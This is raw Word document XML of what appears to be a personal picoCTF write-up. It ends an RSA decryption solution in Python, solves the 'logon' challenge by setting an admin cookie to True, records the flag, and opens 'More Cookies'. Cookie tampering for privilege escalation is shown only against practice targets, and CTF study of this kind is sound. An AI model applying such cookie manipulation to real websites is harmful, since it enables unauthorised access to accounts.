          <w:shd w:val="clear" w:color="auto" w:fill="F0F0F0"/>
        </w:rPr>
        <w:t>n</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1899107986527483535344517113948531328331</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="444444"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F0F0F0"/>
        </w:rPr>
        <w:t xml:space="preserve"> * </w:t>
      </w:r>
      <w:r w:rsidR="004624E7" w:rsidRPr="004624E7">
        <w:rPr>
          <w:rStyle w:val="hljs-number"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="880000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F0F0F0"/>
        </w:rPr>
        <w:t>674357869540600933870145899564746495319033</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55362962" w14:textId="77777777" w:rsidR="00786656" w:rsidRDefault="00786656" w:rsidP="00786656">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FCFCFC"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="135" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>Awesome! Now we can just calculate.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19DE7EDA" w14:textId="77777777" w:rsidR="00786656" w:rsidRDefault="00786656" w:rsidP="00786656">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FCFCFC"/>
        <w:spacing w:before="0" w:line="540" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Solving</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F9EDCF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62324783949134119159408816513334912534343517300880137691662780895409992760262021</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C8F4997"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B5CEA8"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>1280678415822214057864524798453297819181910621573945477544758171055968245116423923</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0007149B"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65537</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AAE1D41"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1899107986527483535344517113948531328331</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74A52120"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B5CEA8"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>674357869540600933870145899564746495319033</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DF4C04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1818D8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proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="004624E7">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="521E77B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p>
    <w:p w14:paraId="75E45A62"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C586C0"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>for</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C586C0"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>in</w:t>
      </w:r>
      <w:r w:rsidRPr="004624E7">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="004624E7">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="9CDCFE"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>x</w:t>
      </w:r>
      <w:r w:rsidRPr="004624E7">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="546C61CE"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a</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CF0ED9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21D74D7D"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phi</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9CDCFE"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>p</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q</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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BC47E83"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1C365A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e</w:t>
      </w:r>
      <w:r w:rsidRPr="004624E7">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>, -</w:t>
      </w:r>
      <w:r w:rsidRPr="004624E7">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="B5CEA8"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidRPr="004624E7">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="004624E7">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="9CDCFE"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="004624E7">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C2AA01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p>
    <w:p w14:paraId="3A4C384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 xml:space="preserve"> = </w:t>
      </w:r>
      <w:r w:rsidRPr="004624E7">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="DCDCAA"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>pow</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9CDCFE"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>c</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d</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n</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="004624E7">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1917859C"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#If a third parameter is present, it returns x to the power of y, modulus z.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="366D83A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6A9955"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>#c ^d %n</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22601FD8"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p>
    <w:p w14:paraId="5CB25F35" w14:textId="77777777" w:rsidR="004624E7" w:rsidRPr="004624E7" w:rsidRDefault="004624E7" w:rsidP="004624E7">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="1E1E1E"/>
        <w:spacing w:line="330" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004624E7">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="DCDCAA"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>print</w:t>
      </w:r>
      <w:r w:rsidRPr="004624E7">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="004624E7">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="4EC9B0"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>bytes</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fromhex</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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hex</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9CDCFE"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>m</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B5CEA8"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>2</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DCDCAA"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>decode</w:t>
      </w:r>
      <w:r w:rsidRPr="004624E7">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r w:rsidRPr="004624E7">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="CE9178"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>'ascii'</w:t>
      </w:r>
      <w:r w:rsidRPr="004624E7">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="414B8C77" w14:textId="77777777" w:rsidR="00786656" w:rsidRPr="00786656" w:rsidRDefault="00786656" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7153CCC3" w14:textId="29888BB3" w:rsidR="007C33FA" w:rsidRDefault="007C33FA" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="76641B3B" w14:textId="79759207" w:rsidR="007C33FA" w:rsidRDefault="007C33FA" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2E701074" w14:textId="3C4F5D40" w:rsidR="007C33FA" w:rsidRDefault="007C33FA" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4BB933B8" w14:textId="1B020106" w:rsidR="00792834" w:rsidRDefault="00792834" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="36EDFB3A" w14:textId="62CBB4D0" w:rsidR="00792834" w:rsidRDefault="00792834" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3BE47A1C" w14:textId="472D6940" w:rsidR="00792834" w:rsidRDefault="00792834" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="342B975D" w14:textId="075A9FD5" w:rsidR="00792834" w:rsidRDefault="00792834" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3AB26813" w14:textId="694F757F" w:rsidR="00792834" w:rsidRDefault="00792834" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="285B65C0" w14:textId="555B3DB5" w:rsidR="00792834" w:rsidRDefault="00792834" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="285B231F" w14:textId="4B5F11FC" w:rsidR="00792834" w:rsidRDefault="00792834" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="50AA7045" w14:textId="77777777" w:rsidR="00792834" w:rsidRPr="00792834" w:rsidRDefault="00792834" w:rsidP="00792834">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0"/>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Open Sans"/>
          <w:color w:val="1D253B"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00792834">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Open Sans"/>
          <w:color w:val="1D253B"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>logon</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35A1D717"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CC566E6" w14:textId="77777777" w:rsidR="00792834" w:rsidRDefault="00792834" w:rsidP="0079283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5C093B5A" w14:textId="77777777" w:rsidR="00792834" w:rsidRDefault="00792834" w:rsidP="0079283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BOBSON</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6936D591" w14:textId="77777777" w:rsidR="00792834" w:rsidRDefault="00792834" w:rsidP="0079283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7AC0EC3" w14:textId="63DC7EE1"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 factory is hiding things from all of its users. Can you login as Joe and find what they've been looking at? </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="F3A4B5"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>https://jupiter.challenges.picoctf.org/problem/13594/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t> (</w:t>
      </w:r>
      <w:hyperlink r:id="rId103"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xml:space="preserve">) or </w:t>
      </w:r>
      <w:hyperlink r:id="rId104" w:history="1">
        <w:r w:rsidRPr="00E22B69">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>http://jupiter.challenges.picoctf.org:13594</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1CFC5D80" w14:textId="640AEC5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21AAB77" wp14:editId="2430BB7D">
            <wp:extent cx="5692633" cy="3154953"/>
            <wp:effectExtent l="0" t="0" r="381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05"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5692633" cy="3154953"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C859643" w14:textId="399C0DEB"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0938308" w14:textId="265AF0F6"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46AF96DC" wp14:editId="263DA7CB">
            <wp:extent cx="6332220" cy="32677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6"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6332220" cy="3267710"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="09DADB85" w14:textId="2C24421A"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0608AF8C" w14:textId="4421F8EE"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Change admin to True and then refresh the page</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B4895AD" w14:textId="2F886775"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F5C780" wp14:editId="55F344BA">
            <wp:extent cx="4130398" cy="1165961"/>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07"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4130398" cy="1165961"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C2B0C28" w14:textId="16578722"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36E7CEA9" wp14:editId="0EC98413">
            <wp:extent cx="6332220" cy="172910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08"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6332220" cy="1729105"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F148C3D" w14:textId="02550217" w:rsidR="00792834" w:rsidRDefault="00792834" w:rsidP="00792834">
      <w:pPr>
        <w:pStyle w:val="body-md"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="75" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="123DDEA3" w14:textId="100FD5D9" w:rsidR="00792834" w:rsidRDefault="000A6F2E" w:rsidP="00792834">
      <w:pPr>
        <w:pStyle w:val="body-md"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="75" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="000A6F2E">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="000A6F2E">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>{th3_c0nsp1r4cy_l1v3s_d1c24fef}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1941D374" w14:textId="06F9C56C" w:rsidR="00792834" w:rsidRDefault="00792834" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="371773B6" w14:textId="19BEDECB" w:rsidR="001C530B" w:rsidRDefault="001C530B" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4A75C4C6" w14:textId="230AAE28" w:rsidR="001C530B" w:rsidRDefault="001C530B" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6BC80048" w14:textId="72BFBC7E" w:rsidR="001C530B" w:rsidRDefault="001C530B" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="40AF352B" w14:textId="1C979527" w:rsidR="001C530B" w:rsidRDefault="001C530B" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3CDF00D8" w14:textId="12CC7168" w:rsidR="001C530B" w:rsidRDefault="001C530B" w:rsidP="001C530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More Cookies</w:t>
      </w:r>
      <w:r w:rsidR="00E114AB">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Open Sans"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="1D253B"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r w:rsidR="00E114AB">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Open Sans"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>HARD</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="523026EC"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1C521E61" w14:textId="77777777" w:rsidR="001C530B" w:rsidRDefault="001C530B" w:rsidP="001C530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15641F45" w14:textId="77777777" w:rsidR="001C530B" w:rsidRDefault="001C530B" w:rsidP="001C530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3D105E1A" w14:textId="77777777" w:rsidR="001C530B" w:rsidRDefault="001C530B" w:rsidP="001C530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7F6E296" w14:textId="275D2144" w:rsidR="001C530B" w:rsidRDefault="001C530B"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I forgot </w:t>
      </w:r>
      <w:r w:rsidRPr="006F0F0E">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t xml:space="preserve">ookies can </w:t>
      </w:r>
      <w:r w:rsidRPr="006F0F0E">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>B</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t xml:space="preserve">e modified </w:t>
      </w:r>
      <w:r w:rsidRPr="006F0F0E">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>lient-side, so now I decided to encrypt them! </w:t>
      </w:r>
      <w:hyperlink r:id="rId109" w:tgtFrame="_blank" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
            <w:color w:val="5969F6"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>http://mercury.picoctf.net:10868/</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3AD1FCAE" w14:textId="78E7FF32"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736282F" w14:textId="4944908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Hints</w:t>
      </w:r>
    </w:p>
